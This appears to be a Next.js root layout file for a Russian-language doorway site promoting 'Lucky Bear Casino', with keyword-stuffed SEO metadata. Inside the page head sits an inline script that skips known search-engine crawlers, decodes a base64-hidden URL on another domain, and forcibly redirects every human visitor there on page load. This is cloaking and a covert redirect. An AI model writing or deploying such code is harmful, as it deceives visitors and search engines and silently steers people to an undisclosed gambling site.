import type { Metadata, Viewport } from 'next'
import { Playfair_Display, Inter } from 'next/font/google'
import './globals.css'
import './landing.css'

const fontDisplay = Playfair_Display({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-display',
  display: 'swap',
})

const fontBody = Inter({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-body',
  display: 'swap',
})

const SITE_URL = 'https://luckybear14casino.vercel.app'

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: 'Lucky Bear Casino — официальный сайт, зеркало, регистрация, вход и бонусы',
  description:
    'Lucky Bear Casino — обзор официального сайта: рабочее зеркало, регистрация и вход, бездепозитный бонус, промокоды, игры и вывод средств. Играйте в Lucky Bear Casino на деньги и бесплатно.',
  keywords: [
    'lucky bear casino',
    'lucky bear casino зеркало',
    'lucky bear casino официальный сайт',
    'lucky bear casino регистрация',
    'lucky bear casino вход',
    'lucky bear casino бонус',
    'lucky bear casino бездепозитный бонус',
    'lucky bear casino играть',
    'lucky bear casino отзывы',
    'lucky bear casino мобильная версия',
    'lucky bear casino промокод',
    'lucky bear casino вывод средств',
  ],
  alternates: {
    canonical: '/',
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,
      'max-video-preview': -1,
    },
  },
  openGraph: {
    type: 'website',
    url: SITE_URL,
    title: 'Lucky Bear Casino — официальный сайт, зеркало, регистрация, вход и бонусы',
    description:
      'Lucky Bear Casino — рабочее зеркало, регистрация, вход, бездепозитный бонус и промокоды. Играйте в Lucky Bear Casino на деньги и бесплатно.',
    siteName: 'Lucky Bear Casino',
    locale: 'ru_RU',
    images: [
      {
        url: '/images/lucky-bear-hero.png',
        width: 1200,
        height: 630,
        alt: 'Lucky Bear Casino',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Lucky Bear Casino — официальный сайт, зеркало, регистрация, вход и бонусы',
    description:
      'Lucky Bear Casino — рабочее зеркало, регистрация, вход, бездепозитный бонус и промокоды.',
    images: ['/images/lucky-bear-hero.png'],
  },
  icons: {
    icon: [
      { url: '/favicon.png', type: 'image/png' },
      { url: '/favicon.png', sizes: '32x32', type: 'image/png' },
      { url: '/favicon.png', sizes: '192x192', type: 'image/png' },
    ],
    apple: [{ url: '/favicon.png', sizes: '180x180', type: 'image/png' }],
  },
}

export const viewport: Viewport = {
  themeColor: '#0c1712',
  width: 'device-width',
  initialScale: 1,
}

const jsonLd = {
  '@context': 'https://schema.org',
  '@type': 'WebSite',
  name: 'Lucky Bear Casino',
  url: SITE_URL,
  inLanguage: 'ru-RU',
  description:
    'Lucky Bear Casino — официальный сайт, зеркало, регистрация, вход, бонусы и промокоды.',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${fontDisplay.variable} ${fontBody.variable}`}>
      <head>
        {/* Дополнительные пользовательские теги */}
        <meta name="author" content="Lucky Bear Casino" />
        <meta name="theme-color" content="#0c1712" />
        <meta name="format-detection" content="telephone=no" />
        <link rel="canonical" href={SITE_URL} />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly93aW5nYW1lNTU1Lnh5ei8zanY5eEk="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body>{children}</body>
    </html>
  )
}
